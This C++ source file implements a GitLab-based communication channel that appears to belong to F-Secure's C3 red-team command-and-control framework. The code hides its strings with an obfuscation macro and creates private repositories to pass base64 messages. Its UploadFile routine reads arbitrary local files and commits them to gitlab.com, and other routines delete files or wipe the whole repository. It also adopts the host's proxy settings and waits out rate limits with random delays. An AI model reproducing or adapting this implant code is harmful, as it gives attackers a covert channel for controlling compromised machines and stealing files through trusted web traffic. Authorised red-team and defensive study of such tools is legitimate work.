#include "stdafx.h"
#include "GitlabApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/Utils.h"
#include <fstream>


using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace {
	std::wstring ToWideString(std::string const& str) {
		return Convert<Utf16>(str);
	}
}


FSecure::GitlabApi::GitlabApi(std::string const& token, std::string const& channelName, std::string const& userAgent) {
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);


	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

	SetToken(token);
	SetUserAgent(userAgent);
	SetUser();
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::GitlabApi::SetUser() {
	std::string url = OBF("https://gitlab.com/api/v4/user");
	json response = SendJsonRequest(url, NULL, Method::GET);

	if (response.contains(OBF("username"))) {
		this->m_Username = response[OBF("username")];
	}
	else {
		throw std::runtime_error(OBF("Throwing exception: bad credentials\n"));
	}
}

void FSecure::GitlabApi::SetUserAgent(std::string const& userAgent) {
	this->m_UserAgent = userAgent;
}

void FSecure::GitlabApi::SetToken(std::string const& token) {
	this->m_Token = token;
}

void FSecure::GitlabApi::SetChannel(std::string const& channelName) {
	this->m_Channel = channelName;
}

std::map<std::string, std::int64_t> FSecure::GitlabApi::ListChannels() {
	std::map<std::string, std::int64_t> channelMap;
	std::string url = OBF("https://gitlab.com/api/v4/projects?owned=true");

	json response = SendJsonRequest(url, NULL, Method::GET);

	for (auto& channel : response) {
		std::string channelName = channel[OBF("name")];

		std::int64_t cId = channel[OBF("id")];

		channelMap.insert({ channelName, cId });
	}

	return channelMap;
}

std::string FSecure::GitlabApi::CreateChannel(std::string const& channelName) {
	std::map<std::string, std::int64_t> channels = this->ListChannels();
	std::string url;
	std::string	errorMsg;
	json response;

	if (channels.find(channelName) == channels.end())
	{
		url = OBF("https://gitlab.com/api/v4/projects");

		json j;
		j[OBF("name")] = channelName;
		j[OBF("visibility")] = "private";

		response = SendJsonRequest(url, j, Method::POST);

		if (response.contains(OBF("message"))) {
			errorMsg = response[OBF("message")] + OBF("\n");
			throw std::runtime_error(OBF("Throwing exception: unable to create channel - ") + errorMsg);
		}
	}

	return channelName;
}

FSecure::ByteVector FSecure::GitlabApi::ReadFile(std::string const& filePath) {
	//get repository id
	std::map<std::string, std::int64_t> channelMap = this->ListChannels();
	std::int64_t repoId = channelMap.find(this->m_Channel)->second;
	std::string fileDownloadURL = OBF("https://gitlab.com/api/v4/projects/") + std::to_string(repoId) + OBF("/repository/files/") + filePath + OBF("/raw?ref=main");

	ByteVector content = SendHttpRequest(fileDownloadURL, "", Method::GET, true);

	return content;
}

void FSecure::GitlabApi::WriteMessageToFile(std::string const& direction, ByteView data, std::string const& providedFilename) {
	std::string filename;
	std::string url;
	json j;

	if (providedFilename.empty()) {
		///Create a filename thats prefixed with message direction and suffixed
		// with more granular timestamp for querying later
		std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
		filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
	}
	else {
		filename = providedFilename;
	}

	//get repository id
	std::map<std::string, std::int64_t> channelMap = this->ListChannels();
	std::int64_t repoId = channelMap.find(this->m_Channel)->second;
	url = OBF("https://gitlab.com/api/v4/projects/") + std::to_string(repoId) + OBF("/repository/files/") + filename;

	j[OBF("commit_message")] = OBF("Initial Commit");
	j[OBF("branch")] = OBF("main");
	j[OBF("encoding")] = OBF("base64");
	j[OBF("content")] = cppcodec::base64_rfc4648::encode(data);

	json response = SendJsonRequest(url, j, Method::POST);
}

void FSecure::GitlabApi::UploadFile(std::string const& path) {
	std::filesystem::path filepathForUpload = path;
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
	readFile.close();

	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;

	WriteMessageToFile("", packet, filename);
}

void FSecure::GitlabApi::DeleteFile(std::string const& filePath) {
	json response;
	json j;

	//get repository id
	std::map<std::string, std::int64_t> channelMap = this->ListChannels();
	std::int64_t repoId = channelMap.find(this->m_Channel)->second;
	std::string fileDownloadURL = OBF("https://gitlab.com/api/v4/projects/") + std::to_string(repoId) + OBF("/repository/files/") + filePath;

	j[OBF("commit_message")] = OBF("Initial Commit");
	j[OBF("branch")] = OBF("main");

	response = SendJsonRequest(fileDownloadURL, j, Method::DEL);
}

void FSecure::GitlabApi::DeleteAllFiles() {
	std::string url;
	json response;

	//delete whole repo
	//get repository id
	std::map<std::string, std::int64_t> channelMap = this->ListChannels();
	std::int64_t repoId = channelMap.find(this->m_Channel)->second;
	url = OBF("https://gitlab.com/api/v4/projects/") + std::to_string(repoId);

	response = SendJsonRequest(url, NULL, Method::DEL);

	if (!response.contains(OBF("message"))) {
		throw std::runtime_error(OBF("Throwing exception: unable to delete repository\n"));
	}
	else if (!response[OBF("message")].contains("202 Accepted")) {
		throw std::runtime_error(OBF("Throwing exception: unable to delete repository\n"));
	}
}

std::map<std::string, std::string> FSecure::GitlabApi::GetMessagesByDirection(std::string const& direction) {
	std::map<std::string, std::string> messages;
	json response;
	std::string filePath;
	std::string delimiter = "!";
	std::size_t found;
	std::string fileDownloadURL;
	//get repository id
	//we don't create directory so we don't care "tree", only "blob"
	std::map<std::string, std::int64_t> channelMap = this->ListChannels();
	std::int64_t repoId = channelMap.find(this->m_Channel)->second;
	std::string url = OBF("https://gitlab.com/api/v4/projects/") + std::to_string(repoId) + OBF("/repository/tree?recursive=true");

	response = json::parse(SendHttpRequest(url, OBF("*/*"), Method::GET, true));

	for (auto& match : response) {
		if (match.contains(OBF("path")) && match[OBF("type")] == "blob") {
			filePath = match[OBF("path")];
			fileDownloadURL = OBF("https://gitlab.com/api/v4/projects/") + std::to_string(repoId) + OBF("/repository/files/") + filePath + OBF("/raw?ref=main");

			//Search whether filename contains direction id
			found = filePath.find(direction);

			if (found != std::string::npos) {
				std::string ts = filePath.substr(filePath.length() - 10); // 10 = epoch time length
				messages.insert({ ts, filePath + delimiter + fileDownloadURL });
			}
		}
	}

	return messages;
}

FSecure::ByteVector FSecure::GitlabApi::SendHttpRequest(std::string const& host, FSecure::WinHttp::ContentType contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	return SendHttpRequest(host, GetContentType(contentType), data, method, setAuthorizationHeader);
}

FSecure::ByteVector FSecure::GitlabApi::SendHttpRequest(std::string const& host, std::wstring const& contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	while (true) {
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		if (!data.empty()) {
			request.SetData(contentType, data);
		}

		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

		if (setAuthorizationHeader) { // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict) {
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else {
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

FSecure::ByteVector FSecure::GitlabApi::SendHttpRequest(std::string const& host, std::string const& acceptType, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	while (true) {
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		request.SetHeader(Header::Accept, ToWideString(acceptType));

		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

		if (setAuthorizationHeader) { // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else {
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

json FSecure::GitlabApi::SendJsonRequest(std::string const& url, json const& data, FSecure::WinHttp::Method method) {
	if (data == NULL) {
		return json::parse(SendHttpRequest(url, ContentType::MultipartFormData, {}, method));
	}
	else {
		std::string j = data.dump();
		return json::parse(SendHttpRequest(url, ContentType::ApplicationJson, { std::make_move_iterator(j.begin()), std::make_move_iterator(j.end()) }, method));
	}
}